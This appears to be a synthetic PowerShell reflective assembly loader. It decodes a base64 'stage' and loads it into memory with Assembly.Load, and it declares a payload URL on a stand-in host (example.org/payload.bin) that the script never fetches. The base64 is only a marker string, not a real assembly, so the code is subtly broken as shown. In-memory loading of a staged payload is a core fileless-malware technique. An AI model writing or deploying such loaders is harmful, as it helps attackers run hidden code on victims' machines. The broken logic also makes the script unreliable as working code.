<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://example.org:8080/payload.bin",
    [int]$TimeoutSec = 54
)
$ErrorActionPreference = "Stop"

$AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjplMXk5bjFvd3Ax')
Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($AssemblyBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

$ProgressPreference = "SilentlyContinue"
